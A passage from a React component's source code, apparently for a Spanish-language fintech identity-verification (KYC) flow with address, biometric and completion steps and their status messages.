                setBiometricStarted(true);
              }}
              disabled={!biometricUrl}
            >
              <ExternalLink className="h-4 w-4" />
              {biometricStarted ? "Abrir nuevamente" : "Iniciar validación"}
            </Button>

            <Button
              variant="outline"
              className="h-11 rounded-2xl sm:flex-1"
              onClick={() => void refreshBiometricStatus()}
              disabled={checkingBiometric || !dni}
            >
              {checkingBiometric ? <Loader2 className="h-4 w-4 animate-spin" /> : <RefreshCw className="h-4 w-4" />}
              Actualizar estado
            </Button>
          </div>

          <div className="mt-4 rounded-2xl border border-primary/20 bg-primary/5 p-4 text-sm text-muted-foreground">
            <div className="flex items-start gap-2">
              <Lock className="mt-0.5 h-4 w-4 shrink-0 text-primary" />
              <p>Hasta finalizar esta etapa, el acceso a la cuenta permanecerá restringido por seguridad.</p>
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  );

  const renderDoneStep = () => (
    <Card className={`${cardClass} mx-auto w-full max-w-2xl`}>
      <CardContent className="p-6 text-center sm:p-8">
        <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-primary/12 text-primary">
          <CheckCircle2 className="h-8 w-8" />
        </div>
        <h2 className="mt-4 text-2xl font-semibold tracking-tight text-foreground">Validación completada</h2>
        <p className="mx-auto mt-2 max-w-lg text-sm leading-relaxed text-muted-foreground">
          Tus datos ya fueron enviados correctamente. En breve vas a poder continuar con el acceso a tu cuenta de {brandName}.
        </p>

        <div className="mt-5 grid gap-3 text-left sm:grid-cols-2">
          <SummaryItem label="Email" value={caseRecord?.email || "—"} />
          <SummaryItem
            label="Enviado"
            value={caseRecord?.submitted_at ? new Date(caseRecord.submitted_at).toLocaleString("es-AR") : "Ahora"}
          />
        </div>
      </CardContent>
    </Card>
  );

  if (loading) {
    return (
      <div className="flex min-h-[260px] items-center justify-center rounded-[24px] border border-border bg-card/95 text-foreground shadow-sm">
        <Loader2 className="h-5 w-5 animate-spin" />
      </div>
    );
  }

  if (!caseRecord || !caseRecord.email) {
    return (
      <Card className={cardClass}>
        <CardContent className="p-6 text-center sm:p-8">
          <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-2xl bg-destructive/10 text-destructive">
            <AlertTriangle className="h-6 w-6" />
          </div>
          <h1 className="mt-4 text-2xl font-semibold text-foreground">Enlace no disponible</h1>
          <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
            Este caso no existe, fue cerrado o no tiene los datos mínimos para iniciar la validación.
          </p>
        </CardContent>
      </Card>
    );
  }

  return (
    <div className={embedded ? "mx-auto w-full max-w-2xl" : "min-h-screen bg-background text-foreground"}>
      <main className={embedded ? "flex w-full flex-col gap-4" : "mx-auto flex w-full max-w-3xl flex-col gap-4 px-4 py-6 sm:px-6"}>
        <Card className={cardClass}>
          <CardContent className="space-y-4 p-5 sm:p-6">
            <div className="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
              <div>
                <p className="text-xs font-semibold uppercase tracking-[0.28em] text-primary">Actualización obligatoria</p>
                <h1 className="mt-1 text-2xl font-semibold tracking-tight text-foreground sm:text-[2rem]">Validación de seguridad</h1>
                <p className="mt-2 max-w-xl text-sm leading-relaxed text-muted-foreground">
                  {brandName} necesita actualizar tus datos para mantener tus fondos seguros. Solo vas a poder acceder a tu cuenta cuando completes el 100% del proceso.
                </p>
              </div>

              <div className="flex flex-wrap gap-2">
                <Badge variant="outline" className={stepBadgeClass}>
                  {step === "done" ? "Completado" : `Paso ${currentStepIndex}/${stepOrder.length}`}
                </Badge>
                <Badge variant="outline">{caseRecord.email}</Badge>
              </div>
            </div>

            <div className="space-y-3">
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">Progreso</span>
                <span className="font-medium text-foreground">{progressValue}%</span>
              </div>
              <Progress value={progressValue} className="h-2" />
              <StepPills step={step} />
            </div>
          </CardContent>
        </Card>

        {step === "verify" && renderVerifyStep()}
        {step === "address" && renderAddressStep()}
        {step === "biometric" && renderBiometricStep()}
        {step === "done" && renderDoneStep()}
      </main>
    </div>
  );
};

export default WayniKycFlow;
